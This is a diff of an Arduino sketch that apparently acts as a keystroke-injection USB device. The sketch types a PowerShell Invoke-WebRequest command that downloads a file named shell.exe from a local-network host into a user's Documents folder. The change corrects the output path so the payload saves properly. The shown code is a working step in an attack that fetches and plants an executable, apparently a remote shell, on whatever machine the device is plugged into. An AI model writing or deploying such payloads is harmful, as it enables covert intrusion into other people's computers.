@@ -36,7 +36,7 @@ void setup()
 
   delay(2000);
 
-  Keyboard.print("Invoke-WebRequest -Uri http://192.168.0.108/shell.exe -OutFile C:\\Users\\SHAAN\\Documents");
+  Keyboard.print("Invoke-WebRequest -Uri http://192.168.0.108/shell.exe -OutFile C:\\Users\\SHAAN\\Documents\\shell.exe");
 
   typeKey(KEY_RETURN);
 
